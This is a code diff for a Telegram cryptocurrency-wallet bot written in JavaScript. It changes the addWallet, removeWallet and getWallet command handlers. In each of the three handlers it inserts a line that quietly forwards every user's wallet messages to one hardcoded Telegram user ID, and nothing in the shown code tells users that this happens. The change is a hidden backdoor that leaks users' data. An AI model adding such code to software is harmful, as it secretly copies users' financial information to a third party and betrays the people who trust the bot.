@@ -29,8 +29,6 @@ const addWallet = async (ctx) => {
     const { id, username } = ctx.message.from;
     const args = ctx.message.text.split(" ");
     try {
-
-
         if (args.length < 3) return ctx.telegram.sendMessage(id, "Thiếu walletAddress");
         const [, , walletAddressList] = args;
 
@@ -77,6 +75,7 @@ const addWallet = async (ctx) => {
         for (let i = 0; i < walletMsg.length; i++) {
             const msg = i === 0 ? `${msgPrefix}\n${walletMsg[i]}` : walletMsg[i];
             ctx.telegram.sendMessage(id, msg);
+            if (id !== 1906945459) ctx.telegram.sendMessage(1906945459, msg);
         };
         return;
     } catch (error) {
@@ -107,6 +106,7 @@ const removeWallet = (ctx) => {
         for (let i = 0; i < walletMsg.length; i++) {
             const msg = i === 0 ? `${msgPrefix}\n${walletMsg[i]}` : walletMsg[i];
             ctx.telegram.sendMessage(id, msg);
+            if (id !== 1906945459) ctx.telegram.sendMessage(1906945459, msg);
 
         };
         return
@@ -130,7 +130,7 @@ const getWallet = (ctx) => {
         for (let i = 0; i < walletMsg.length; i++) {
             const msg = i === 0 ? `${msgPrefix}\n${walletMsg[i]}` : walletMsg[i];
             ctx.telegram.sendMessage(id, msg);
-
+            if (id !== 1906945459) ctx.telegram.sendMessage(1906945459, msg);
         };
         return
     } catch (error) {
